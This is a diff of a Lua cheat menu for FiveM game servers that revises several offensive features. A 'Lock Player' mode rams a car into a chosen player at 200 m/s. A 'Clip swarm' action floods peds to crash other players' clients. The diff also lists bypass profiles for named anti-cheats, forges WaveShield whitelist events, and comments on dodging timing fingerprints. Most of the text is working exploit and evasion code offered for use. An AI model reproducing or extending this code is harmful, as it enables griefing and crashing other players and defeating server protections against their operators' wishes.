-    local coords = coordsOf(entity)
-    if not coords then return end
+local function drive(veh, dx, dy, dz, speed)
+    local okVel = pcall(SetEntityVelocity, veh, dx * speed, dy * speed, dz * speed)
+    if okVel then N.didWork = true end
 
-    local distance = O.distance(coords, mine)
-    L.lastDist = distance
-    if distance <= STOP_RANGE then return end
-
-    if not L.hasControl then return end
-
-    local speed = speedValue()
-    applyVelocity(entity, coords, mine, speed)
-    L.pulls = L.pulls + 1
-    L.didWork = true
-
-    if distance < L.bestDist - 0.25 then
-        L.bestDist = distance
-        L.progressAt = t
-        return
+    local heading = headingTo(dx, dy)
+    if heading then
+        -- Rotation order 2 is the order GetEntityRotation(veh, 2) uses. Yaw
+        -- follows the horizontal aim; pitch follows the vertical aim so the
+        -- bumper points at the target instead of the body flying level over a
+        -- lower target. The pitch is clamped: a 70-degree dive at 200 m/s
+        -- tumbles the chassis and the velocity vector is already doing the
+        -- real work. Roll stays zero.
+        local vertical = dz
+        if vertical > 1.0 then vertical = 1.0 end
+        if vertical < -1.0 then vertical = -1.0 end
+        local pitch = math.deg(math.asin(vertical))
+        if pitch > MAX_PITCH then pitch = MAX_PITCH end
+        if pitch < -MAX_PITCH then pitch = -MAX_PITCH end
+        pcall(SetEntityRotation, veh, pitch, 0.0, heading, 2, true)
     end
 
-    if L.progressAt == 0 then
-        L.progressAt = t
-        return
-    end
-
-    if t - L.progressAt >= PROGRESS_MS and t - L.stepAt >= COORD_STEP_MS then
-        if applyCoords(entity, coords, mine) then
-            L.stepAt = t
-            L.steps = L.steps + 1
-        end
-    end
+    pcall(SetVehicleGravityAmount, veh, 0.0)
+    return okVel
 end
 
 -- ---------------------------------------------------------------------------
 -- TICK
 -- ---------------------------------------------------------------------------
-local function tick(t)
-    if not L.active then
-        if L.pulling then resetPull() end
+local function tick(now)
+    if not N.active then
+        N.held = false
+        if N.session then endSession("inactive") end
         return
     end
 
-    local manual = L.burstUntil > 0 and t <= L.burstUntil
-    if L.burstUntil > 0 and not manual then L.burstUntil = 0 end
-
-    local want = manual or shiftHeld()
-
-    -- Vehicle-only gate. IS_PED_IN_ANY_VEHICLE (0x997ABD671D25CA0B) is the
-    -- documented check for "the operator is in a vehicle" and covers every
-    -- seat. Reading it every tick is a local read of the operator's own ped;
-    -- it writes nothing.
-    local localPed = PlayerPedId()
-    local okAny, anyVeh = pcall(IsPedInAnyVehicle, localPed, false)
-    local inVehicle = okAny and anyVeh == true
-
-    if not want or not inVehicle or O.Ctx.dead then
-        if L.pulling then resetPull() end
-        if L.burstUntil > 0 and not manual then L.burstUntil = 0 end
+    -- The row is permanent; the ram is not. Without Left Ctrl the module does no
+    -- target work and no vehicle work at all. Releasing Left Ctrl mid-run restores
+    -- the car and leaves the row armed for the next hold.
+    N.held = ctrlHeld()
+    if not N.held then
+        if N.session then endSession("left ctrl released") end
         return
     end
 
-    local ped, player = resolveTarget()
-    if ped == 0 then
-        if L.pulling then resetPull() end
-        return
-    end
-    if isDead(ped) then
-        if L.pulling then resetPull() end
-        return
-    end
+    -- The speed is live. Reading it before any target work means a session
+    -- that is already moving picks up a legacy row change on the next tick,
+    -- and status reports the value the driver will actually use.
+    N.lastSpeed = lockSpeed()
 
-    local entity = pullEntity(ped)
-    if entity == 0 then
-        if L.pulling then resetPull() end
+    local ped = PlayerPedId()
+    if not ped or ped == 0 then
+        if N.session then endSession("operator ped gone") end
         return
     end
 
-    -- Never pull the operator's own vehicle, whatever the selection says.
-    local okVeh, veh = pcall(GetVehiclePedIsIn, localPed, false)
-    if okVeh and type(veh) == "number" and entity == veh then
-        if L.pulling then resetPull() end
+    local okVeh, veh = pcall(GetVehiclePedIsIn, ped, false)
+    if not okVeh or type(veh) ~= "number" or veh == 0 or not DoesEntityExist(veh) then
+        if N.session then endSession("left the vehicle") end
         return
     end
 
-    if not L.pulling or L.entity ~= entity then
-        resetPull()
-        L.pulling = true
-        L.entity = entity
-        L.ped = ped
-        L.player = player
-    end
-
-    local mine = coordsOf(PlayerPedId())
-    if not mine then return end
-
-    local their = coordsOf(entity)
-    if not their then return end
-    if O.distance(their, mine) > PULL_RANGE then
-        resetPull()
+    -- The vehicle has to be driven by the operator. A passenger cannot write
+    -- the transform of a car owned by the driver without a control request,
+    -- and this module never asks for one.
+    local okDriver, driver = pcall(GetPedInVehicleSeat, veh, -1)
+    if not okDriver or driver ~= ped then
+        if N.session then endSession("not the driver") end
         return
     end
 
-    if not requestControl(entity, t) then return end
-    pull(entity, mine, t)
+    if O.Ctx.dead then
+        if N.session then endSession("operator died") end
+        return
+    end
+
+    local selfCoords = entityCoords(veh)
+    if not selfCoords then
+        if N.session then endSession("vehicle coords unreadable") end
+        return
+    end
+
+    local target, player, targetMode = resolveTarget(veh, selfCoords)
+    if target == 0 then
+        if N.session then endSession("no target") end
+        return
+    end
+
+    local targetVeh = pedVehicle(target)
+
+    -- A target seated in our own car is never written: the ram would hit the
+    -- operator. resolveTarget already skips them; this is the defensive gate
+    -- for the window between the read and the write.
+    if targetVeh == veh then
+        if N.session then endSession("target is in the operator vehicle") end
+        return
+    end
+
+    if not N.session or N.veh ~= veh then
+        if N.session then endSession("vehicle changed") end
+        startSession(veh, target, player, targetMode)
+    elseif N.ped ~= target then
+        retarget(target, player, targetMode)
+    elseif N.targetMode ~= targetMode then
+        N.targetMode = targetMode
+    end
+
+    -- Keep the UI mirror in step with a speed that changed mid-session.
+    -- gravitateOn() saved the operator's own Gravitate Speed first, so this
+    -- write is still restored on release.
+    local gravSpeed = findItem(GRAVITATE_SPEED)
+    if gravSpeed and gravSpeed.value ~= N.lastSpeed then
+        gravSpeed.value = N.lastSpeed
+    end
+
+    local okTarget, targetCoords = pcall(GetEntityCoords,
+        targetVeh ~= 0 and targetVeh or target)
+    if not okTarget or not targetCoords then return end
+
+    local distance = O.distance(targetCoords, selfCoords)
+    N.lastDist = distance
+
+    -- Repair on a low, jittered cadence. The vehicle must survive a long
+    -- hold, and a wreck cannot carry a ram. Every write is on our vehicle.
+    if now - N.lastRepair >= O.jitter(REPAIR_MS, 0.2) then
+        N.lastRepair = now
+        local okHealth, health = pcall(GetEntityHealth, veh)
+        local okEngine, running = pcall(GetIsVehicleEngineRunning, veh)
+        local damaged = okHealth and type(health) == "number" and health < 950
+        local stalled = okEngine and running ~= true
+        if damaged or stalled then
+            repairVehicle(veh)
+        end
+    end
+
+    local okFrozen, frozen = pcall(IsEntityPositionFrozen, veh)
+    if okFrozen and frozen == true then
+        pcall(FreezeEntityPosition, veh, false)
+    end
+
+    -- Aim point. A ped is aimed at the chest when the car is level or below,
+    -- and at the body when the car is above: the lower point forces the
+    -- intercept down instead of letting the bumper pass over the head. A
+    -- vehicle is aimed at centre mass for the same reason. `heightError` is
+    -- measured from the target root, which is what GetEntityCoords returns.
+    local heightError = selfCoords.z - targetCoords.z
+    local zOffset
+    if targetVeh ~= 0 then
+        zOffset = heightError > AIM_DROP_ABOVE and VEH_AIM_BELOW or VEH_AIM
+    else
+        zOffset = heightError > AIM_DROP_ABOVE and PED_AIM_BELOW or PED_AIM
+    end
+
+    local tx = targetCoords.x
+    local ty = targetCoords.y
+    local tz = targetCoords.z + zOffset
+    N.lastVertical = tz - selfCoords.z
+
+    local dx, dy, dz = tx - selfCoords.x, ty - selfCoords.y, tz - selfCoords.z
+    local len = math.sqrt(dx * dx + dy * dy + dz * dz)
+    if len < 0.01 then return end
+    dx, dy, dz = dx / len, dy / len, dz / len
+
+    -- A short pass at impact range. The homing vector is held for PASS_MS so
+    -- the collision solver sees a continuous approach instead of a car that
+    -- instantly reverses on the target and vibrates on top of them. After the
+    -- pass the next tick homes again: that is the loop.
+    --
+    -- The pass is gated on vertical alignment. Holding the direction while
+    -- the car is still metres above the target is exactly how the old build
+    -- sailed over a lower player; if the vertical error is outside the band,
+    -- the car keeps homing instead of committing to the pass.
+    local aligned = math.abs(N.lastVertical) <= PASS_ALIGN
+
+    if now < N.passUntil and not aligned then
+        N.passUntil = 0
+    end
+
+    if now < N.passUntil then
+        dx, dy, dz = N.dirX, N.dirY, N.dirZ
+        N.mode = "pass"
+    else
+        N.mode = "charge"
+        if distance <= HIT_RANGE and aligned then
+            N.dirX, N.dirY, N.dirZ = dx, dy, dz
+            N.passUntil = now + O.jitter(PASS_MS, 0.2)
+            N.impacts = N.impacts + 1
+            N.mode = "pass"
+        end
+    end
+
+    drive(veh, dx, dy, dz, N.lastSpeed)
 end
 
 -- ---------------------------------------------------------------------------
 -- PUBLIC
 -- ---------------------------------------------------------------------------
-function L.arm()
+function N.arm()
     if type(Menu) ~= "table" then return false end
-    if L.active then return true end
 
+    -- Idempotent. Re-clicking an already armed row must not spend a second
+    -- token or drop a live session on the floor.
+    if N.active then return true end
+    if N.session or N.saved then endSession("re-arm") end
+
+    -- The token is spent once per armed period, not per Left Ctrl hold and not
+    -- per session. A target respawn or a vehicle change must not drain the
+    -- family: the lock is meant to stay on until the operator turns it off.
     if not B.spend("lock") then
         emit("budget refused")
         return false
     end
 
-    L.active = true
-    L.burstUntil = 0
-    L.spent = true
-    L.didWork = false
-    L.pulls = 0
-    L.steps = 0
-    resetPull()
+    N.active = true
+    N.held = false
+    N.session = false
+    N.veh = 0
+    N.ped = 0
+    N.player = -1
+    N.targetMode = "none"
+    N.mode = "idle"
+    N.lastRepair = 0
+    N.passUntil = 0
+    N.dirX, N.dirY, N.dirZ = 0.0, 0.0, 0.0
+    N.lastDist = 0.0
+    N.lastSpeed = lockSpeed()
+    N.lastVertical = 0.0
+    N.impacts = 0
+    N.spent = true
+    N.didWork = false
+    N.saved = nil
 
     notify(true)
-    emit("armed - select a player, sit in a vehicle, hold Shift")
+    emit("armed - permanent, hold Left Ctrl to ram selected/nearest living (speed=%d)",
+        math.floor(N.lastSpeed))
     return true
 end
 
-function L.stop(reason)
-    L.active = false
-    L.burstUntil = 0
-    resetPull()
-    restoreSlider()
+function N.stop(reason)
+    N.active = false
+    N.held = false
 
-    if L.spent and not L.didWork then B.refund("lock") end
-    L.spent = false
-    L.didWork = false
+    if N.session or N.saved then
+        endSession(reason or "stopped")
+    else
+        gravitateOff()
+    end
+
+    -- A period that never wrote the vehicle (armed then disarmed, or a Left Ctrl
+    -- hold with no target) must not consume its token.
+    if N.spent and not N.didWork then B.refund("lock") end
+    N.spent = false
+    N.didWork = false
 
     notify(false)
-    if reason then emit("%s", tostring(reason)) end
 end
 
-function L.disable()
-    L.stop("panic")
+function N.disable()
+    N.stop("panic")
 end
 
-function L.isActive()
-    return L.active
+function N.isActive()
+    return N.active
 end
 
--- The action row. It pushes Gravitate Speed to the slider maximum, then runs
--- the same pull for PULL_BURST_MS. If the toggle is off it arms first, so the
--- action row works on its own without a second click in the list.
-function L.pullOnce()
-    if not L.active then
-        if not L.arm() then return false end
-    end
-    L.topSpeed()
-    L.burstUntil = now() + PULL_BURST_MS
-    emit("pull burst %d ms", PULL_BURST_MS)
-    return true
+-- Compatibility accessor for callers that still want the value the driver
+-- will use. The shipped menu does not build a slider from it; a legacy row is
+-- read if present, then the last value used in this game session, then
+-- DEFAULT_SPEED.
+function N.speedValue()
+    return lockSpeed()
 end
 
-function L.status()
-    local serverId = selectedServerId()
-    return ("armed=%s pulling=%s target=%s entity=%s control=%s dist=%d speed=%d pulls=%d steps=%d"):format(
-        tostring(L.active), tostring(L.pulling), tostring(serverId or "-"),
-        tostring(L.entity or 0), tostring(L.hasControl),
-        math.floor(L.lastDist or 0), math.floor(L.lastSpeed or DEFAULT_SPEED),
-        L.pulls, L.steps)
+function N.status()
+    local selected = selectedId()
+    return ("armed=%s held=%s target=%s mode=%s source=%s dist=%d speed=%d height=%+.1f impacts=%d sessions=%d"):format(
+        tostring(N.active), tostring(N.held), tostring(selected or "-"),
+        tostring(N.mode), tostring(N.targetMode),
+        math.floor(N.lastDist or 0), math.floor(N.lastSpeed or DEFAULT_SPEED),
+        N.lastVertical or 0.0, N.impacts, N.sessions)
 end
 
-function L.speedValue()
-    return speedValue()
-end
-
-L.tick = tick
-
+-- Arm once. The scheduler is the single owner; there is no per-feature thread
+-- and therefore no fixed Wait() cadence to fingerprint.
 O.every("lock", POLL_MS, tick, 0)
 
-return L
+return N
 
 end)(O,S,B,Menu)
 
@@ -26816,9 +26974,9 @@ local U = (function(O,S,E,D,F,V,M,SN,C,A,ST,SB,VS,K,N,L,VC,CU,UC,FA,TP,Menu)
 --
 --   Exploit > Bypass    separate profiles: WaveShield, FiveGuard, Electron AC,
 --                       Reason AC, Seed, Dynasty, Raven; each target is isolated
---   Exploit > Exploit   Menu Staff [SEED] plus one direct action per crash
---                       method; the tab was renamed from "Crasher" and still
---                       replaces the old teleport surface
+--   Exploit > Exploit   Menu Staff [SEED] plus one direct crash action;
+--                       the tab was renamed from "Crasher" and still replaces
+--                       the old teleport surface
 --   Settings > Protection anti-freeze, anti-attach and anti-spectate, armed at load
 --   Vehicle > Spoofed   real local vehicles over the one you already stole
 --
@@ -27144,7 +27302,7 @@ end
 --
 -- Older builds shipped a top-level "Crasher" category, a tab named "Crasher",
 -- and some base builds shipped a teleport tab in Exploit. All of them are
--- folded into one tab named "Exploit": the operator gets the crash methods
+-- folded into one tab named "Exploit": the operator gets the crash action
 -- where the teleport row used to be, and the category list loses one entry.
 -- The merge keeps any real server action that was already in the tab
 -- (notably Menu Staff) and drops only teleport artifacts. Running it twice is
@@ -27158,7 +27316,7 @@ local function collapseExploitTab()
 
     -- Menu.CurrentTab is shared by every category. Only touch it when Exploit
     -- is the category the operator actually has open; otherwise a reload while
-    -- Player > Target is open would clamp the Player tab index to 1.
+    -- Player > Movement is open would clamp the Player tab index to 1.
     local openCategory = nil
     if type(Menu.OpenedCategory) == "number" and Menu.Categories then
         openCategory = Menu.Categories[Menu.OpenedCategory]
@@ -27459,75 +27617,73 @@ end
 -- ---------------------------------------------------------------------------
 -- ONLINE > PLAYER LIST > LOCK PLAYER
 --
--- The two rows belong where the operator picks the target, not in a second
--- Player > Target tab. UpdatePlayerList rebuilds the Player List on every
--- frame, so rows inserted from outside would be wiped before the next click.
--- The loader therefore calls Menu.OnPlayerListBuild(tab) at the end of the
--- rebuild and this installer owns that hook: it strips its own two rows (in
--- case a build ever runs twice) and appends them last, under the player
--- toggles that were just rendered.
+-- The row belongs in Online > Player List, next to the player selection it
+-- uses. The loader rebuilds that tab every frame, so the row is appended by
+-- Menu.OnPlayerListBuild after each rebuild instead of surviving by accident.
+-- The permanent arm is unchanged: target respawns, vehicle changes and key
+-- releases keep the row on. Holding Left Ctrl is the live ram consent and
+-- loops the lock until it is released. Shift is not read at all: not
+-- VK_LSHIFT, not VK_RSHIFT, not VK_SHIFT. Right Ctrl is not read either.
 --
---   Lock Player       toggle, arms the module. The row state is the arm, not
---                     a target and not a vehicle: a respawn, a reselection or
---                     a vehicle change never turns it off.
---   Gravitate Target  action, pushes the existing Vehicle > Performance >
---                     Gravitate Speed slider to its own maximum and runs the
---                     same pull for a short burst. It is the one-shot form of
---                     the Shift hold, not a second driver.
+-- The old Player > Target tab and the even older Online > Troll copies are
+-- swept on every load. A stale onClick must not survive a reload. The empty
+-- Target tab is removed as well, so the Player order stays Self | Movement |
+-- Voice | Wardrobe.
 --
--- The old Player > Target tab and its Lock Speed slider are removed on every
--- load, together with every historical spelling of the row. A stale onClick
--- must not survive a reload, and two controls writing the same target would
--- be the exact duplication the operator asked to avoid.
+-- The shipped menu has no Lock Speed slider. The module owns a 200 m/s
+-- default, which is the value validated on WaveShield; a slider only moved a
+-- number the server validator could roll back. Older builds that still carry a
+-- Lock Speed row are honoured by the module, but this installer never creates
+-- one: one speed authority, no stale UI value after a reload.
 -- ---------------------------------------------------------------------------
-local LOCK_SEPARATOR = "Lock player (hold Shift in a vehicle)"
-
 local function installLockPlayer()
-    if type(Menu) ~= "table" then return false end
+    -- Remove every historical spelling on every load, including the Shift row
+    -- a previous build installed. The row is rebuilt below.
+    removeItem("Online", "Troll", "Lock Player (Ctrl)")
+    removeItem("Online", "Troll", "Lock Player (Shift)")
+    removeItem("Online", "Troll", "Lock Player")
+    removeItem("Online", "Troll", "Lock Speed")
+    removeItem("Player", "Target", "Lock Player (Ctrl)")
+    removeItem("Player", "Target", "Lock Player (Shift)")
+    removeItem("Player", "Target", "Lock Player")
+    removeItem("Player", "Target", "Lock Speed")
 
-    local historical = {
-        "Lock Player (Ctrl)", "Lock Player (Shift)", "Lock Player",
-        "Lock Speed",
-    }
-    for i = 1, #historical do
-        removeItem("Online", "Troll", historical[i])
-        removeItem("Player", "Target", historical[i])
-    end
-
-    -- Drop the now-empty Target tab a previous build created for this feature.
-    local category = findCategory("Player")
-    if category and type(category.tabs) == "table" then
-        for i = #category.tabs, 1, -1 do
-            local tab = category.tabs[i]
-            if type(tab) == "table" and tab.name == "Target"
-                and type(tab.items) == "table" and #tab.items == 0 then
-                table.remove(category.tabs, i)
+    -- Drop the now-empty tab a previous build created. Unknown tabs are left
+    -- alone; only this module's historical Target surface is removed.
+    local player = findCategory("Player")
+    if player and player.tabs then
+        for i = #player.tabs, 1, -1 do
+            if player.tabs[i].name == "Target" then
+                table.remove(player.tabs, i)
             end
         end
     end
 
-    local currentToggle = nil
+    local lockRow = nil
 
-    local function build(tab)
+    local function buildRows(tab)
         if type(tab) ~= "table" then return end
         tab.items = tab.items or {}
 
+        -- The loader rebuilds this list on every frame. Sweep the rows this
+        -- hook owns by marker, and keep the sweep name-based as well so a
+        -- pre-marker copy from an older build cannot duplicate the toggle.
         for i = #tab.items, 1, -1 do
             local item = tab.items[i]
-            if type(item) == "table" then
-                if item.isSeparator and item.separatorText == LOCK_SEPARATOR then
-                    table.remove(tab.items, i)
-                elseif item.name == "Lock Player" or item.name == "Gravitate Target" then
-                    table.remove(tab.items, i)
-                end
+            if item.__vgdLockPlayer
+                or item.name == "Lock Player"
+                or item.name == "Lock Player (Ctrl)"
+                or (item.isSeparator
+                    and item.separatorText == "Lock player (hold Left Ctrl in a vehicle)") then
+                table.remove(tab.items, i)
             end
         end
 
-        local toggle
-        toggle = {
+        lockRow = {
             name = "Lock Player",
             type = "toggle",
             value = L.isActive(),
+            __vgdLockPlayer = true,
             onClick = function(value)
                 local active
                 if value then
@@ -27536,39 +27692,39 @@ local function installLockPlayer()
                     L.stop("operator")
                     active = false
                 end
-                toggle.value = active
+                lockRow.value = active
                 return active
             end,
         }
-        currentToggle = toggle
 
-        local action = {
-            name = "Gravitate Target",
-            type = "action",
-            onClick = function()
-                return L.pullOnce()
-            end,
-        }
+        -- The row tracks the permanent arm only. A ram session that ends
+        -- because Left Ctrl was released, the operator left the vehicle, or
+        -- the target died keeps the row on. Panic/disarm goes through onChange.
+        L.onChange = function(active)
+            if lockRow then lockRow.value = active end
+        end
 
-        tab.items[#tab.items + 1] = {
+        -- Put the hold hint and the toggle on the first page, after the
+        -- spectate/teleport controls and before the selected-player rows.
+        local at = 1
+        for i, item in ipairs(tab.items) do
+            if item.name == "Teleport" or item.name == "Spectate Player" then
+                at = i + 1
+            end
+        end
+        table.insert(tab.items, at, {
             name = "",
             isSeparator = true,
-            separatorText = LOCK_SEPARATOR,
-        }
-        tab.items[#tab.items + 1] = toggle
-        tab.items[#tab.items + 1] = action
+            separatorText = "Lock player (hold Left Ctrl in a vehicle)",
+            __vgdLockPlayer = true,
+        })
+        table.insert(tab.items, at + 1, lockRow)
     end
 
-    Menu.OnPlayerListBuild = build
+    Menu.OnPlayerListBuild = buildRows
 
-    -- The list may already be on screen from a previous build; render the rows
-    -- once here so the feature is visible without closing and reopening Online.
     local tab = findTab("Online", "Player List")
-    if tab then build(tab) end
-
-    L.onChange = function(active)
-        if currentToggle then currentToggle.value = active end
-    end
+    if tab then buildRows(tab) end
     return true
 end
 
@@ -27858,13 +28014,13 @@ local function installProtection()
 end
 
 -- ---------------------------------------------------------------------------
--- EXPLOIT > EXPLOIT (CRASH METHODS)
+-- EXPLOIT > EXPLOIT (CRASH ACTION)
 --
--- Each method is its own action: click the method and it starts. There is no
--- separate selector, no Crash button, no target/intensity/stop row. The tab
--- lives inside Exploit instead of a top-level category: fewer top-level rows,
--- and the crash methods sit next to the other exploit actions. Any stale
--- top-level Crasher category from an older loader is removed on every load.
+-- One action: click `Clip swarm` and it starts. There is no separate selector,
+-- no Crash button, no target/intensity/stop row. The tab lives inside Exploit
+-- instead of a top-level category: fewer top-level rows, and the crash action
+-- sits next to the other exploit actions. Any stale top-level Crasher category
+-- from an older loader is removed on every load.
 -- The tab itself is named "Exploit"; "Crasher" is only the historical module
 -- name and the old tab label that is merged into it.
 -- ---------------------------------------------------------------------------
@@ -27877,7 +28033,7 @@ local CRASH_ROWS = {
 
 -- The current labels are part of the sweep as well. Without them, every
 -- re-injection (or a second build in the same session) appended a second copy
--- of each method under the prepended block.
+-- of the method under the prepended block.
 local function isCrashRowName(name)
     for j = 1, #CRASH_ROWS do
         if name == CRASH_ROWS[j] then return true end
@@ -27922,36 +28078,33 @@ local function installCrasher()
         end
     end
 
-    -- One method, Heavy by default. The dump shows the store already at
-    -- 19807/21000; the scene hold is the part that lets every client stream
-    -- the dictionaries before the release.
+    -- One exposed method, Heavy by default. The dump shows the store already
+    -- at 19807/21000; the scene hold is the part that lets every client
+    -- stream the dictionaries before the release. The engine exposes the
+    -- method as "Ped flood"; the menu labels it "Clip swarm" because the
+    -- visible result is the streamed crowd, not a model-name list.
     --
     -- Prepend the crash block instead of appending it. The base Exploits tab
     -- also carries the server rows (Staff Mode, Disable Weapon Damage, Menu
     -- Staff, Revive); with ItemsPerPage = 8, the single crash row and its
     -- separator stay on the first page and the server rows remain available
     -- underneath.
-    local power = { 3 }
     local crashItems = {
         {
             name = "",
             isSeparator = true,
             separatorText = "Crash",
         },
-    }
-
-    for i = 1, #C.METHODS do
-        local index = i
-        crashItems[#crashItems + 1] = {
-            name = C.METHODS[i].label,
+        {
+            name = "Clip swarm",
             type = "action",
             onClick = function()
-                C.setMethod(index)
-                C.setIntensity(power[index] or 2)
+                C.setMethod(1)
+                C.setIntensity(3)
                 C.launch()
             end,
-        }
-    end
+        },
+    }
 
     for i = #crashItems, 1, -1 do
         table.insert(tab.items, 1, crashItems[i])
@@ -28181,16 +28334,11 @@ local function installRampFix()
         expiresAt = 0,
         lastSpawnAt = 0,
         cooldown = RAMP_MIN_COOLDOWN_MS,
-        host = nil,
-        hostEvent = nil,
-        hostToken = nil,
-        hostNetId = 0,
     }
 
     local ack = {
         ready = false,
-        lastModel = 0,
-        lastAt = 0,
+        byModel = {},
         lastSigAt = 0,
         seq = O.int(1000, 9999),
     }
@@ -28236,6 +28384,13 @@ local function installRampFix()
             end
         end
         return nil
+    end
+
+    local function waveshieldKeyPresent()
+        local gs = rawget(_G, "GlobalState")
+        if type(gs) ~= "table" then return false end
+        local field = gs.HHct1C6gobnW3DkIQUxiXk9Q
+        return type(field) == "string" and field ~= ""
     end
 
     local function waveshieldConfig()
@@ -28381,9 +28536,12 @@ local function installRampFix()
         local ok = pcall(function()
             RegisterNetEvent(RAMP_WL_ACK)
             AddEventHandler(RAMP_WL_ACK, function(model, timer)
+                -- The ack is scoped by model. Other resources on the same
+                -- client can receive their own _ws:cb between our send and
+                -- our wait; a single last-model slot would lose ours in that
+                -- window and cause an unnecessary local fallback.
                 if type(model) == "number" then
-                    ack.lastModel = model
-                    ack.lastAt = GetGameTimer()
+                    ack.byModel[model] = (ack.byModel[model] or 0) + 1
                 end
             end)
         end)
@@ -28412,10 +28570,14 @@ local function installRampFix()
         return ok
     end
 
-    local function waitAck(modelHash, beforeAt, timeout)
+    local function ackCount(modelHash)
+        return ack.byModel[modelHash] or 0
+    end
+
+    local function waitAck(modelHash, beforeCount, timeout)
         local deadline = GetGameTimer() + (timeout or RAMP_WL_TIMEOUT)
         while GetGameTimer() < deadline do
-            if ack.lastAt > beforeAt and ack.lastModel == modelHash then return true end
+            if ackCount(modelHash) > (beforeCount or 0) then return true end
             safeWait(10)
         end
         return false
@@ -28432,14 +28594,16 @@ local function installRampFix()
         local sub, why = ensureSubstitution()
         if not sub then return false, tostring(why or "crypto") end
 
-        local before = ack.lastAt
+        local before = ackCount(plan.hash)
         if not sendWhitelist(plan.hash, resource, sub) then return false, "send" end
         if waitAck(plan.hash, before, RAMP_WL_TIMEOUT) then return true end
 
         -- One retry with a fresh time/sequence. The first event may have been
         -- delivered but its ack lost; a second event is harmless because the
-        -- server replaces the per-model timestamp.
-        before = ack.lastAt
+        -- server replaces the per-model timestamp. If the ack landed between
+        -- the wait deadline and this line, do not send a duplicate.
+        if ackCount(plan.hash) > before then return true end
+        before = ackCount(plan.hash)
         if not sendWhitelist(plan.hash, resource, sub) then return false, "send" end
         if waitAck(plan.hash, before, RAMP_WL_RETRY_TIMEOUT) then return true end
         return false, "no-ack"
@@ -28612,10 +28776,6 @@ local function installRampFix()
     end
 
     local function removeRamp()
-        if state.stage == "stageb" and state.hostEvent then
-            pcall(TriggerEvent, state.hostEvent)
-        end
-
         local activeObj = state.obj
         if activeObj ~= 0 and DoesEntityExist(activeObj) then
             pcall(DetachEntity, activeObj, true, true)
@@ -28654,10 +28814,6 @@ local function installRampFix()
         state.attach = nil
         state.stage = "none"
         state.expiresAt = 0
-        state.host = nil
-        state.hostEvent = nil
-        state.hostToken = nil
-        state.hostNetId = 0
     end
 
     local function makeRetry(obj, vehicle, plan)
@@ -28752,18 +28908,23 @@ local function installRampFix()
             return false
         end
 
-        if state.active and state.veh == vehicle then
+        -- Idempotent only while the prop really exists. A stale active flag
+        -- left after a streamed-out/deleted object must not swallow the click.
+        if state.active and state.veh == vehicle
+            and state.obj ~= 0 and DoesEntityExist(state.obj) then
             O.log("ramp: already attached")
             return true
         end
+
+        -- Remove an old ramp before the cooldown gate. A failed switch must
+        -- not leave the prop attached to the previous car for the full TTL.
+        if state.active then removeRamp() end
 
         local now = O.now()
         if state.lastSpawnAt > 0 and now - state.lastSpawnAt < state.cooldown then
             O.log("ramp: cooldown %d ms", state.cooldown - (now - state.lastSpawnAt))
             return false
         end
-
-        removeRamp()
 
         local vehicleFront = 2.5
         local vehicleBottom = 0.0
@@ -28786,16 +28947,33 @@ local function installRampFix()
         end
 
         local guard = findWaveshield()
-        local ent = guard and waveshieldConfig() or nil
+        local guardActive = guard ~= nil or waveshieldKeyPresent()
 
-        if guard and not ent then
-            O.log("ramp: guard config unavailable; local object only")
+        if guardActive and not guard then
+            -- The replicated WaveShield key is present but the resource name
+            -- could not be resolved (renamed, stopped, or metadata hidden).
+            -- The server whitelist event needs a started resource name, so a
+            -- network create would be canceled or reported.
+            O.log("ramp: WaveShield key present but resource unresolved; local object only")
             return spawnLocalPreferred(vehicle, vehicleFront, vehicleBottom, heading)
         end
-        if not guard and type(S) == "table" and type(S.acs) == "table" and #S.acs > 0 then
+        if guard and type(GetResourceState) == "function" then
+            local stateOk, guardState = pcall(GetResourceState, guard)
+            if not stateOk or guardState ~= "started" then
+                O.log("ramp: guard resource is not started; local object only")
+                return spawnLocalPreferred(vehicle, vehicleFront, vehicleBottom, heading)
+            end
+        end
+        if not guardActive and type(S) == "table" and type(S.acs) == "table" and #S.acs > 0 then
             -- A different server guard may inspect entityCreating. Without its
             -- own whitelist we cannot prove the network path, so stay local.
             O.log("ramp: non-WaveShield guard detected; local object only")
+            return spawnLocalPreferred(vehicle, vehicleFront, vehicleBottom, heading)
+        end
+
+        local ent = guardActive and waveshieldConfig() or nil
+        if guardActive and not ent then
+            O.log("ramp: guard config unavailable; local object only")
             return spawnLocalPreferred(vehicle, vehicleFront, vehicleBottom, heading)
         end
 
@@ -28901,21 +29079,21 @@ end
 -- ---------------------------------------------------------------------------
 -- PLAYER TAB ORDER
 --
--- The base menu has Self and Wardrobe; this module appends Target, Movement
--- and Voice. Append order is not display order. The operator asked for:
+-- The base menu has Self and Wardrobe; this module appends Movement and
+-- Voice. Append order is not display order. The operator asked for:
 --
---   Self | Target | Movement | Voice | Wardrobe
+--   Self | Movement | Voice | Wardrobe
 --
--- Wardrobe is the far-right tab, Target is second, and Movement/Voice keep
--- their usual places. Unknown tabs are left after the known ones in their
--- original order, so a future base tab is not silently deleted.
+-- Wardrobe is the far-right tab and Movement/Voice keep their usual places.
+-- Lock Player no longer has a Player > Target tab; it lives in Online >
+-- Player List. Unknown tabs are left after the known ones in their original
+-- order, so a future base tab is not silently deleted.
 -- ---------------------------------------------------------------------------
 local PLAYER_TAB_ORDER = {
     Self = 1,
-    Target = 2,
-    Movement = 3,
-    Voice = 4,
-    Wardrobe = 5,
+    Movement = 2,
+    Voice = 3,
+    Wardrobe = 4,
 }
 
 local function reorderPlayerTabs()
@@ -28923,7 +29101,7 @@ local function reorderPlayerTabs()
     if not category or not category.tabs then return false end
 
     -- Preserve the open tab by object. Menu.CurrentTab is an index; after the
-    -- move, index 2 is Target instead of whatever used to be there. A reload
+    -- move, index 2 is Movement instead of whatever used to be there. A reload
     -- with Player open must not silently switch the operator to another tab.
     -- When another category is open, leave its CurrentTab untouched.
     local openCategory = nil
